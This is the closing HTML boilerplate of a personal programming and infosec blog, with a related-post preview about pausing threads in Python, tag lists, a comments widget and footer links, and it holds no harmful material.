href="/tags/infosec/" itemprop="keywords">infosec</a> </span><span><a class="jtag" href="/tags/programming/" itemprop="keywords">programming</a></span></div></div></div></div></article></div><div class="related-col-flex-auto-4"><article class="post-minified-preview"><a href="/posts/delay-and-interactive-pause-in-multithreaded-python/"></a><div class="d-flex flex-column"><a class="post-thumbnail" href="/posts/delay-and-interactive-pause-in-multithreaded-python/"><img class="post-img-blurred-bg" src="/img/posts/programming/mini-projects/interactive-pause-python/assets/thumbnail-512w.webp" loading="lazy" decoding="async" style="aspect-ratio: auto 512 / 384" alt="Thumbnail for Delay and Interactive Pause in Multi-Threaded Python" srcset="/img/posts/programming/mini-projects/interactive-pause-python/assets/thumbnail-256w.webp 256w, /img/posts/programming/mini-projects/interactive-pause-python/assets/thumbnail-512w.webp 512w, /img/posts/programming/mini-projects/interactive-pause-python/assets/thumbnail-1024w.webp 1024w" sizes="(max-width: 256px) 256px, (max-width: 512px) 512px, 512px"><div class="post-img-container d-flex jw-100 h-100"><img class="post-img-contain" src="/img/posts/programming/mini-projects/interactive-pause-python/assets/thumbnail-512w.webp" loading="lazy" decoding="async" style="aspect-ratio: auto 512 / 384" alt="Thumbnail for Delay and Interactive Pause in Multi-Threaded Python" srcset="/img/posts/programming/mini-projects/interactive-pause-python/assets/thumbnail-256w.webp 256w, /img/posts/programming/mini-projects/interactive-pause-python/assets/thumbnail-512w.webp 512w, /img/posts/programming/mini-projects/interactive-pause-python/assets/thumbnail-1024w.webp 1024w" sizes="(max-width: 256px) 256px, (max-width: 512px) 512px, 512px"></div></a><div class="post-content d-flex flex-column justify-content-between"><div><h2 class="post-title">Delay and Interactive Pause in Multi-Threaded Python</h2><div class="post-summary"><p>It's like musical chairs for threads (except no one gets left behind)!</p></div></div><div class="metadata-tag-container d-flex flex-row align-items-top"><div class="tag-list mt-2 d-flex flex-row flex-wrap align-items-center"><span><a class="jtag" href="/tags/programming/" itemprop="keywords">programming</a> </span><span><a class="jtag" href="/tags/python/" itemprop="keywords">python</a> </span><span><a class="jtag" href="/tags/tutorial/" itemprop="keywords">tutorial</a></span></div></div></div></div></article></div></div><hr><h3><i class="fas fa-tags me-2"></i>Related Tags</h3><div class="mt-3"><h4><abbr data-bs-placement="top" data-bs-toggle="tooltip" title="Related to cpp">software.programming-language</abbr></h4><span class="d-flex flex-wrap"><a class="jtag" href="/tags/cpp/">cpp</a> <a class="jtag" href="/tags/python/">python</a> <a class="jtag" href="/tags/c/">c</a> <a class="jtag" href="/tags/haskell/">haskell</a> <a class="jtag" href="/tags/js/">js</a> <a class="jtag" href="/tags/qt/">qt</a> <a class="jtag" href="/tags/rust/">rust</a> <a class="jtag" href="/tags/qml/">qml</a> <a class="jtag" href="/tags/sql/">sql</a> <a class="jtag" href="/tags/java/">java</a> <a class="jtag" href="/tags/scala/">scala</a></span></div><div class="mt-3"><h4><abbr data-bs-placement="top" data-bs-toggle="tooltip" title="Related to ctf, infosec, pwn">software.security</abbr></h4><span class="d-flex flex-wrap"><a class="jtag" href="/tags/ctf/">ctf</a> <a class="jtag" href="/tags/infosec/">infosec</a> <a class="jtag" href="/tags/reverse/">reverse</a> <a class="jtag" href="/tags/pentesting/">pentesting</a> <a class="jtag" href="/tags/pwn/">pwn</a> <a class="jtag" href="/tags/cryptography/">cryptography</a> <a class="jtag" href="/tags/cve/">cve</a> <a class="jtag" href="/tags/redteam/">redteam</a> <a class="jtag" href="/tags/stego/">stego</a></span></div><div class="mt-3"><h4><abbr data-bs-placement="top" data-bs-toggle="tooltip" title="Related to research, writeup">misc</abbr></h4><span class="d-flex flex-wrap"><a class="jtag" href="/tags/writeup/">writeup</a> <a class="jtag" href="/tags/notes/">notes</a> <a class="jtag" href="/tags/tutorial/">tutorial</a> <a class="jtag" href="/tags/project/">project</a> <a class="jtag" href="/tags/reflection/">reflection</a> <a class="jtag" href="/tags/hkust/">hkust</a> <a class="jtag" href="/tags/experience/">experience</a> <a class="jtag" href="/tags/research/">research</a> <a class="jtag" href="/tags/faith/">faith</a> <a class="jtag" href="/tags/learning/">learning</a> <a class="jtag" href="/tags/meta/">meta</a> <a class="jtag" href="/tags/mathematics/">mathematics</a> <a class="jtag" href="/tags/cheatsheet/">cheatsheet</a> <a class="jtag" href="/tags/satire/">satire</a> <a class="jtag" href="/tags/essay/">essay</a> <a class="jtag" href="/tags/reading/">reading</a></span></div></div><hr class="section-sep"><div class="container-md mt-4 p-4"><a id="comments"></a><p>Comments are back! Privacy-focused; without ads, bloatware 🤮, and trackers. Be one of the first to contribute to the discussion— before AI invades social media, world leaders declare war on guppies, and what little humanity left is lost to time.</p><script defer src="/js/comentario.min.js"></script><script>if(window.location.hash.startsWith("#comentario")){const a=document.getElementById("comments");a&&a.scrollIntoView({behavior:"smooth"})}</script><comentario-comments id="comentario" auto-init="false" no-fonts="true" css-override="false" theme="dark"></comentario-comments></div><br></div></div></article></div></div></div><footer class="d-flex flex-column gap-2"><div class="d-flex flex-row gap-3 mx-auto" style="width:fit-content;"><a rel="me noreferrer" href="https://github.com/TrebledJ" target="_blank"><i class="social-icon fab fa-github" style="color:rgb(150, 60, 180) !important;"></i> </a><a rel="me noreferrer" href="https://infosec.exchange/@trebledj" target="_blank"><i class="social-icon fab fa-mastodon" style="color:rgb(99, 101, 255) !important;"></i> </a><a rel="me noreferrer" href="https://x.com/trebledjjj" target="_blank"><i class="social-icon fab fa-twitter" style="color:rgb(99, 101, 255) !important;"></i> </a><a rel="me noreferrer" href="https://stackoverflow.com/users/10239789/trebledj" target="_blank"><i class="social-icon fab fa-stack-overflow" style="color:rgb(236, 124, 34) !important;"></i> </a><a rel="me noreferrer" href="https://soundcloud.com/trebledj" target="_blank"><i class="social-icon fab fa-soundcloud" style="color:rgb(237, 110, 30) !important;"></i> </a><a rel="me noreferrer" href="https://discordapp.com/users/220427982798454794" target="_blank"><i class="social-icon fab fa-discord" style="color:rgb(84, 100, 235) !important;"></i> </a><a rel="me" href="mailto:trebledjjj@gmail.com"><i class="social-icon fas fa-envelope"></i> </a><a rel="me" href="/feeds"><i class="social-icon fas fa-square-rss"></i></a></div><p>Copyright&nbsp;©&nbsp;2026&nbsp;TrebledJ • <a href="/privacy-policy">Privacy&nbsp;Policy</a> • <a href="https://github.com/TrebledJ/trebledj.github.io?tab=readme-ov-file#credits--appreciation" rel="noreferrer" target="_blank">Credits</a></p></footer><script defer src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script><script defer src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.11.8/dist/umd/popper.min.js"></script><script defer src="https://cdn.jsdelivr.net/npm/lunr@2.3.9/lunr.min.js"></script><script defer src="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/jquery.magnific-popup.min.js"></script><script>var tocOptions={}</script><script defer src="/cb/YmP0cUsv-I.js"></script><script defer src="https://static.cloudflareinsights.com/beacon.min.js" data-cf-beacon="{&quot;token&quot;: &quot;52d99b3d385b4c9a98ac8ad109a95a2a&quot;}"></script></body></html>